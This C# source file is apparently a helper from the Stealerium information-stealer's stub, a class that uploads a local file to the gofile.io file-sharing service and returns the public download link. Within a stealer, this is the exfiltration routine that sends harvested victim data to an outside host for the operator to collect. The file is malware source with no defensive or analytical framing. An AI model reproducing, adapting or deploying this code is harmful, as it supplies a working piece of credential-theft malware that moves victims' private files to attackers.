using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text.Json.Serialization;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Stealerium.Stub.Helpers
{
    internal sealed class GofileFileService
    {
        private const string ServiceEndpoint = "https://{server}.gofile.io/";

        public static async Task<string> UploadFileAsync(string file)
        {
            using (var client = new HttpClient())
            {
                var optimalServer = GetServerAsync(client);
                var endpoint = ServiceEndpoint.Replace("{server}", await optimalServer.ConfigureAwait(false));

                var content = new MultipartFormDataContent
                {
                    { new StreamContent(File.OpenRead(file)), "file", Path.GetFileName(file) }
                };

                var response = await client.PostAsync(endpoint + "uploadfile", content).ConfigureAwait(false);
                var responseBody = await response.Content.ReadAsStringAsync().ConfigureAwait(false);
                var rawJson = JObject.Parse(responseBody);
                var d = JsonConvert.SerializeObject(rawJson);
                var output = JsonConvert.DeserializeObject<ApiResponse>(d);

                return output.Data["downloadPage"].ToString();
            }
        }

        private static async Task<string> GetServerAsync(HttpClient client)
        {
            // Fetch the server list
            var request = await client.GetStringAsync(ServiceEndpoint.Replace("{server}", "api") + "servers").ConfigureAwait(false);
            var output = JObject.Parse(request);

            // Deserialize 'servers' as a list of objects
            var servers = output["data"]?["servers"]?.ToObject<List<JObject>>();

            if (servers == null || servers.Count == 0)
            {
                throw new NotSupportedException("No servers found or the API response is invalid.");
            }

            // Pick the first server in the "eu" region
            var preferredServer = servers.FirstOrDefault(s => s["zone"]?.ToString() == "eu")?["name"]?.ToString();

            // If no server in the "eu" zone is found, fall back to the first server
            if (string.IsNullOrEmpty(preferredServer))
            {
                preferredServer = servers.First()?["name"]?.ToString();
            }

            if (string.IsNullOrEmpty(preferredServer))
            {
                throw new NotSupportedException("No valid server name found.");
            }

            return preferredServer;
        }

    }

    /// <summary>
    ///     Data class for the gofile.io api v2
    ///     example: {"status":"ok","data":{"server":"store1"}}
    ///     example: {"status":"ok","data":{"code":"123Abc","adminCode":"3ZcBq12nrYu4cbSwJVYY","file":{"name":"file.txt",
    ///     [...]}}}
    /// </summary>
    public class ApiResponse
    {
        [JsonPropertyName("status")] public string Status { get; set; }

        [JsonPropertyName("data")] public Dictionary<string, object> Data { get; set; }
    }
}